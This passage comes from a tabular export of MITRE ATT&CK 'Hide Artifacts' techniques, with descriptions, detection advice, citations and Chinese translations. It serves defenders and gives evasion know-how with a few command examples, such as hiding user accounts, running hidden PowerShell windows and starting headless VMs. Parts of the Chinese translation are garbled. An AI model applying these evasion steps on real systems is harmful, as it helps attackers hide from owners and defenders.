On Windows systems, monitor for creation of suspicious inbox rules through the use of the <code>New-InboxRule</code> and <code>Set-InboxRule</code> PowerShell cmdlets.(Citation: Microsoft BEC Campaign) On MacOS systems, monitor for modifications to the <code>RulesActiveState.plist</code>, <code>SyncedRules.plist</code>, <code>UnsyncedRules.plist</code>, and <code>MessageRules.plist</code> files.(Citation: MacOS Email Rules)","Google Workspace, Linux, Office 365, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, File: File Modification",True,T1564,,"Dor Edry, Microsoft",,,,,,,"(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Microsoft Get-InboxRule)",隐藏工件/隐藏攻击行为：电子邮件隐藏规则,攻击者可能会使用电子邮件规则来隐藏受感染用户邮箱中的入站电子邮件。许多电子邮件客户端允许用户为各种电子邮件功能创建收件箱规则，包括将电子邮件移动到其他文件夹、将电子邮件标记为已读或删除电子邮件。可以在电子邮件客户端或通过外部功能（例如 <code>New-InboxRule</code> 或 <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org)）创建或修改规则/techniques/T1059/001) Windows 系统上的 cmdlet。（引用：Microsoft 收件箱规则）（引用：MacOS 电子邮件规则）（引用：Microsoft New-InboxRule）（引用：Microsoft Set-InboxRule）用户的邮箱删除和/或将电子邮件移动到不太明显的文件夹。攻击者可能会这样做以隐藏安全警报、C2 通信或对从受感染帐户发送的 [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) 电子邮件的响应。组织内的任何用户或管理员（或具有有效凭据的对手）都可以创建规则以自动移动或删除电子邮件。如果用户或防御者立即看到电子邮件内容，这些规则可能会被滥用以削弱/延迟检测。恶意规则通常根据关键字（例如 <code>malware</code>、<code>suspicious</code>、<code>phish</code> 和 <code>hack</code>）过滤掉电子邮件在邮件正文和主题行中找到。 （引用：微软云应用安全）
T1564.005,Hide Artifacts: Hidden File System,"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)

Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)",https://attack.mitre.org/techniques/T1564/005,28 June 2020,29 June 2020,1.0,Defense Evasion,"Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting [Bootkit](https://attack.mitre.org/techniques/T1542/003) activity.","Linux, Windows, macOS","File: File Modification, Firmware: Firmware Modification, Windows Registry: Windows Registry Key Modification",True,T1564,,,"Administrator, User",,,,,,"(Citation: Kaspersky ProjectSauron Full Report),(Citation: Kaspersky Equation QA),(Citation: ESET ComRAT May 2020),(Citation: Kaspersky Regin),(Citation: FireEye Bootkits),",隐藏工件/隐藏攻击行为：隐藏文件系统,攻击者可能会使用隐藏的文件系统来隐藏用户和安全工具的恶意活动。文件系统提供了一种结构来存储和访问物理存储中的数据。通常，用户通过允许他们访问文件和目录的应用程序与文件系统进行交互，这些应用程序是对其物理位置（例如：磁盘扇区）的抽象。标准文件系统包括 FAT、NTFS、ext4 和 APFS。文件系统还可以包含其他结构，例如 NTFS 中的卷引导记录 (VBR) 和主文件表 (MFT)。（引用：MalwareTech VFS，2014 年 11 月）攻击者可以使用自己的抽象文件系统，与标准文件系统分开存在于受感染的系统上。这样做，攻击者可以从安全工具中隐藏恶意组件和文件输入/输出的存在。隐藏文件系统，有时称为虚拟文件系统，可以通过多种方式实现。一种实现方式是将文件系统存储在磁盘结构或标准文件系统分区未使用的保留磁盘空间中。（引用：MalwareTech VFS 2014 年 11 月）（引用：FireEye Bootkits）另一种实现可能是攻击者删除他们自己的便携式分区图像作为标准文件系统之上的文件。（引用：ESET ComRAT 2020 年 5 月）攻击者还可能以非标准方式跨现有文件系统结构分割文件。（引用：卡巴斯基方程 QA）
T1564.001,Hide Artifacts: Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.

Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",https://attack.mitre.org/techniques/T1564/001,26 February 2020,29 March 2020,1.0,Defense Evasion,"Monitor the file system and shell commands for files being created with a leading ""."" and the Windows command-line use of attrib.exe to add the hidden attribute.","Linux, Windows, macOS","Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation",True,T1564,Host forensic analysis,,User,,,,,,"(Citation: Trend Micro IXESHE 2012),(Citation: NCC Group WastedLocker June 2020),(Citation: Symantec Calisto July 2018),(Citation: trendmicro xcsset xcode project 2020),(Citation: McAfee Sharpshooter December 2018),(Citation: alientvault macspy),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: TrendMicro macOS Dacls May 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Unit 42 BackConfig May 2020),(Citation: Lazarus APT January 2022),(Citation: Talos Rocke August 2018),(Citation: objsee mac malware 2017),(Citation: ESET Machete July 2019),(Citation: Talos PoetRAT April 2020),(Citation: Unit 42 Rocke January 2019),(Citation: Securelist Calisto July 2018),(Citation: Infoblox Lokibot January 2019),(Citation: ESET InvisiMole June 2020),(Citation: ESET LoudMiner June 2019),(Citation: Carbon Black Shlayer Feb 2019),(Citation: TrendMicro MacOS April 2018),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: CISA AppleJeus Feb 2021),(Citation: Radware Micropsia July 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: CoinTicker 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: ESET Okrum July 2019),(Citation: Trusteer Carberp October 2010),(Citation: Avira Mustang Panda January 2020),(Citation: LogRhythm WannaCry),(Citation: Trend Micro DRBControl February 2020),(Citation: wardle evilquest parti),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: ESET Attor Oct 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Talos Seduploader Oct 2017),(Citation: Sofacy Komplex Trojan),(Citation: ESET OceanLotus macOS April 2019),",隐藏工件/隐藏攻击行为：隐藏的文件和目录,攻击者可能会将文件和目录设置为隐藏以逃避检测机制。为了防止普通用户意外更改系统上的特殊文件，大多数操作系统都有“隐藏”文件的概念。当用户使用 GUI 浏览文件系统或在命令行上使用普通命令时，这些文件不会显示。用户必须通过一系列图形用户界面 (GUI) 提示或命令行开关（Windows 的 <code>dir /a</code> 和 <code>ls –a</code>）明确要求显示隐藏文件适用于 Linux 和 macOS）。在 Linux 和 Mac 上，用户只需添加一个“.”即可将特定文件标记为隐藏。作为文件或文件夹名称中的第一个字符（引用：Sofacy Komplex Trojan）（引用：过时的 Mac 恶意软件）。以句点“.”开头的文件和文件夹默认隐藏，无法在 Finder 应用程序和标准命令行实用程序（如“ls”）中查看。用户必须专门更改设置才能查看这些文件。 macOS 上的文件也可以用 UF_HIDDEN 标志标记，以防止在 Finder.app 中看到它们，但仍允许在 Terminal.app 中看到它们（引用：WireLurker）。在 Windows 上，用户可以使用 attrib.exe 二进制文件将特定文件标记为隐藏。许多应用程序创建这些隐藏的文件和文件夹来存储信息，这样就不会弄乱用户的工作空间。例如，SSH 实用程序会创建一个隐藏的 .ssh 文件夹，其中包含用户已知的主机和密钥。攻击者可以利用这一点来隐藏系统上任何位置的文件和文件夹，并规避不包含对隐藏文件的调查的典型用户或系统分析。
T1564.002,Hide Artifacts: Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. 

In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user’s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) 

Adversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)

On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",https://attack.mitre.org/techniques/T1564/002,13 March 2020,19 April 2022,1.2,Defense Evasion,"Monitor for users that may be hidden from the login screen but still present in additional artifacts of usage such as directories and authentication logs. 

Monitor processes and command-line events for actions that could be taken to add a new user and subsequently hide it from login screens. Monitor Registry events for modifications to the <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> key.

In macOS, monitor for commands, processes, and file activity in combination with a user that has a userID under 500.(Citation: Cybereason OSX Pirrit) Monitor for modifications to set the <code>Hide500Users</code> key value to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Monitor the command line for usage of the <code>dscl . create</code> command with the <code>IsHidden</code> attribute set to <code>1</code>.(Citation: Apple Support Hide a User Account) ","Linux, Windows, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, User Account: User Account Creation, User Account: User Account Metadata, Windows Registry: Windows Registry Key Modification",True,T1564,,Omkar Gudhate,,,,,,,"(Citation: FireEye SMOKEDHAM June 2021),(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),",隐藏工件/隐藏攻击行为：隐藏的用户,攻击者可能会使用隐藏用户来隐藏他们创建或修改的用户帐户的存在。当给定系统上有许多用户帐户时，或者如果他们想要对其他用户隐藏他们的管理或其他管理帐户，管理员可能想要隐藏用户。在 macOS 中，攻击者可以通过操纵 plist 文件、文件夹属性和用户属性来创建或修改要隐藏的用户。为了防止用户显示在登录屏幕和系统偏好设置中，攻击者可以将 userID 设置为低于 500，并将 <code>Hide500Users</code> 的键值设置为 <code>TRUE</code> 在 < code>/Library/Preferences/com.apple.loginwindow</code> plist 文件。（引用：Cybereason OSX Pirrit）每个用户都有一个与之关联的用户 ID。当 <code>Hide500Users</code> 键值设置为 <code>TRUE</code> 时，用户 ID 低于 500 的用户不会出现在登录屏幕和系统偏好设置中。使用命令行，攻击者可以使用 <code>dscl</code> 实用程序通过将 <code>IsHidden</code> 属性设置为 <code>1</code> 来创建隐藏的用户帐户。攻击者还可以通过将 <code>chflags</code> 更改为隐藏来隐藏用户的主文件夹。（引用：Apple 支持隐藏用户帐户）攻击者可以类似地隐藏 Windows 中的用户帐户。攻击者可以将特定用户的 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> 注册表键值设置为 <code>0</code> 以防止该用户被列出（引文：FireEye SMOKEDHAM 2021 年 6 月）（引文：US-CERT TA18-074A）在 Linux 系统上，攻击者可能会在登录屏幕上隐藏用户帐户，也称为欢迎程序。攻击者可能使用的方法取决于分发当前使用的显示管理器。例如，在使用 GNOME 显示管理器 (GDM) 的 Ubuntu 系统上，可以使用 <code>gsettings</code> 命令（例如：<code>sudo -u gdm gsettings set org.gnome. login-screen disable-user-list true</code>)。（引用：隐藏 GDM 用户帐户）显示管理器不锚定到特定的分布，可能会被用户或对手更改。
T1564.003,Hide Artifacts: Hidden Window,"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. 

On Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)

Similarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.

Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)",https://attack.mitre.org/techniques/T1564/003,13 March 2020,15 March 2022,1.1,Defense Evasion,"Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.","Linux, Windows, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, Script: Script Execution",True,T1564,,"Travis Smith, Tripwire",User,,,,,,"(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Alperovitch 2014),(Citation: FireEye APT32 May 2017),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: McAfee Cuba April 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: PTSecurity Higaisa 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: TrendMicro BlackTech June 2017),(Citation: ESET InvisiMole June 2020),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Unit 42 Inception November 2018),(Citation: FireEye APT19),(Citation: Talos Promethium June 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Cybereason Astaroth Feb 2019),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Unit 42 Gamaredon February 2022),(Citation: objective-see windtail1 dec 2018),(Citation: Bromium Ursnif Mar 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: Talos Kimsuky Nov 2021),(Citation: McAfee APT28 DDE1 Nov 2017),(Citation: Medium Metamorfo Apr 2020),(Citation: Unit 42 DarkHydrus July 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: FireEye APT29),(Citation: Secureworks MCMD July 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Check Point Meteor Aug 2021),(Citation: Carbon Black HotCroissant April 2020),(Citation: FireEye APT34 Dec 2017),(Citation: Microsoft Actinium February 2022),(Citation: FireEye Operation Double Tap),",隐藏工件/隐藏攻击行为：隐藏窗口,攻击者可能会使用隐藏窗口来隐藏用户的恶意活动。在某些情况下，可以隐藏应用程序执行操作时通常会显示的窗口。系统管理员可以利用它来避免在执行管理任务时破坏用户工作环境。在 Windows 上，Windows 中的脚本语言有多种特性，例如 [PowerShell](https://attack.mitre.org/techniques/T1059/001)、Jscript 和 [Visual Basic](https:// attack.mitre.org/techniques/T1059/005）来隐藏窗口。这方面的一个例子是 <code>powershell.exe -WindowStyle Hidden</code>。 （引用：PowerShell About 2019）同样，在 macOS 上，应用程序运行方式的配置列在属性列表 (plist) 文件中。这些文件中的标签之一可以是 <code>apple.awt.UIElement</code>，它允许 Java 应用程序阻止应用程序的图标出现在 Dock 中。一个常见的用途是应用程序在系统托盘中运行，但又不想出现在 Dock 中。攻击者可能会滥用这些功能来隐藏用户可见的窗口，以免提醒用户系统上的攻击活动。（引用：过时的 Mac 恶意软件）
T1564.004,Hide Artifacts: NTFS File Attributes,"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)

Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",https://attack.mitre.org/techniques/T1564/004,13 March 2020,29 March 2020,1.0,Defense Evasion,"Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)

There are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.

The Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)",Windows,"Command: Command Execution, File: File Metadata, File: File Modification, Process: OS API Execution",True,T1564,"Anti-virus, Host forensic analysis, Signature-based detection","Oddvar Moe, @oddvarmoe; Red Canary",,,NTFS partitioned hard drive,,,,"(Citation: Cyberreason Anchor December 2019),(Citation: SentinelOne Valak June 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: LOLBAS Expand),(Citation: Ciubotariu 2014),(Citation: Kaspersky Regin),(Citation: Crowdstrike Indrik November 2018),(Citation: Cybereason Valak May 2020),(Citation: LOLBAS Esentutl),(Citation: Volexity PowerDuke November 2016),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET LoJax Sept 2018),(Citation: Cisco DNSMessenger March 2017),(Citation: ESET Gazer Aug 2017),(Citation: Unit 42 Valak July 2020),(Citation: InsiderThreat NTFS EA Oct 2017)",隐藏工件/隐藏攻击行为：NTFS 文件属性,攻击者可能会使用 NTFS 文件属性隐藏其恶意数据以逃避检测。每个新技术文件系统 (NTFS) 格式化的分区都包含一个主文件表 (MFT)，该表维护分区上每个文件/目录的记录。 （引文：SpectorOps 基于主机的 2017 年 7 月）在 MFT 条目中是文件属性，（引文：Microsoft NTFS 文件属性 2010 年 8 月）例如扩展属性 (EA) 和数据 [称为备用数据流 (ADS)，当多个数据属性存在]，可用于存储任意数据（甚至完整文件）。 （引用：SpectorOps Host-Based Jul 2017）（引用：Microsoft File Streams）（引用：MalwareBytes ADS 2015 年 7 月）（引用：Microsoft ADS 2014 年 3 月）攻击者可能会将恶意数据或二进制文件存储在文件属性元数据中，而不是直接存储在文件中。这样做可能是为了规避一些防御措施，例如静态指标扫描工具和防病毒。 （引文：IR ZeroAccess NTFS EA 之旅）（引文：MalwareBytes ADS 2015 年 7 月）
T1564.010,Hide Artifacts: Process Argument Spoofing,"Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)

Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)

Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)

This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.",https://attack.mitre.org/techniques/T1564/010,19 November 2021,29 November 2021,1.0,Defense Evasion,"Detection of process argument spoofing may be difficult as adversaries may momentarily modify stored arguments used for malicious execution. These changes may bypass process creation detection and/or later process memory analysis. Consider monitoring for [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), which includes monitoring for process creation (especially those in a suspended state) as well as access and/or modifications of these processes (especially by the parent process) via Windows API calls.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)

Analyze process behavior to determine if a process is performing actions it usually does not and/or do no align with its logged command-line arguments.",Windows,Process: Process Creation,True,T1564,,,User,,,,,,"(Citation: FireEye FiveHands April 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),",隐藏工件/隐藏攻击行为：进程参数欺骗,攻击者可能会尝试通过覆盖进程内存来隐藏进程命令行参数。进程命令行参数存储在进程环境块 (PEB) 中，PEB 是 Windows 用来存储有关进程/由进程使用的各种信息的数据结构。 PEB 包括在执行进程时引用的进程命令行参数。创建流程时，监控流程创建的防御工具/传感器可能会从 PEB 检索流程参数。（引用：Microsoft PEB 2021）（引用：Xpn Argue Like Cobalt 2019）攻击者可能会操纵流程 PEB 以逃避防御。例如，[Process Hollowing](https://attack.mitre.org/techniques/T1055/012) 可以被滥用以产生具有良性参数的处于暂停状态的进程。在进程生成并初始化 PEB 后（并且进程信息可能由工具/传感器记录），攻击者可能会覆盖 PEB 以修改命令行参数（例如：使用 [Native API](https://attack .mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> 函数）然后使用恶意参数恢复进程执行。（引用：Cobalt Strike Arguments 2019）（引用：Xpn Argue Like Cobalt 2019）（引用：Nviso Spoof Command Line 2020）攻击者还可能使用恶意命令行参数执行进程，然后使用良性参数修补内存，从而绕过后续进程内存分析。（引文：FireEye FiveHands April 2021）此行为也可能与其他技巧结合使用（例如 [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) 来操纵或进一步规避基于进程的检测。
T1564.009,Hide Artifacts: Resource Forking,"Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)

Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)",https://attack.mitre.org/techniques/T1564/009,12 October 2021,05 May 2022,1.0,Defense Evasion,"Identify files with the <code>com.apple.ResourceFork</code> extended attribute and large data amounts stored in resource forks. 

Monitor command-line activity leveraging the use of resource forks, especially those immediately followed by potentially malicious activity such as creating network connections. ",macOS,"Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation",True,T1564,"Gatekeeper, Notarization",Ivan Sinyakov; Jaron Bradley @jbradley89,,,,,,,"(Citation: sentinellabs resource named fork 2020),(Citation: OSX Keydnap malware),(Citation: tau bundlore erika noerenberg 2020),(Citation: Apple App Security Overview)",隐藏工件/隐藏攻击行为：资源分叉,攻击者可能会滥用资源分叉来隐藏恶意代码或可执行文件以逃避检测和绕过安全应用程序。资源分支为应用程序提供了一种结构化的方式来存储资源，例如缩略图、菜单定义、图标、对话框和代码。（引用：macOS 分层文件系统概述）资源分支的使用在显示文件的扩展属性时是可识别的，使用 <code>ls -l@</code> 或 <code>xattr -l</code> 命令。资源分叉已被弃用并被应用程序包结构取代。非本地化资源放置在应用程序包的顶级目录中，而本地化资源放置在 <code>/Resources</code> 文件夹中。（引用：资源和数据分叉）（引用：ELC 扩展属性）对手可以使用资源分叉来隐藏可能直接存储在文件中的恶意数据。攻击者可以在指定的偏移量处执行带有附加资源分支的内容，然后将其移动到可执行位置然后调用。资源分叉内容也可能在执行前被混淆/加密。（引用：名为 fork 2020 的哨兵资源）（引用：tau bundlore erika noerenberg 2020）
T1564.006,Hide Artifacts: Run Virtual Instance,"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)

Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)",https://attack.mitre.org/techniques/T1564/006,29 June 2020,14 October 2021,1.1,Defense Evasion,"Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring the size of virtual machines running on the system. Adversaries may create virtual images which are smaller than those of typical virtual machines.(Citation: Shadowbunny VM Defense Evasion) Network adapter information may also be helpful in detecting the use of virtual instances.

Consider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a silent installation may be especially suspect (ex. <code>-silent</code>, <code>-ignore-reboot</code>), as well as those associated with running a headless (in the background with no UI) virtual instance (ex. <code>VBoxManage startvm $VM --type headless</code>).(Citation: Shadowbunny VM Defense Evasion) Similarly, monitoring command line arguments which suppress notifications may highlight potentially malicious activity (ex. <code>VBoxManage.exe setextradata global GUI/SuppressMessages ""all""</code>).

Monitor for commands which enable hypervisors such as Hyper-V.  If virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for [Windows Service](https://attack.mitre.org/techniques/T1543/003), with respect to virtualization software. 

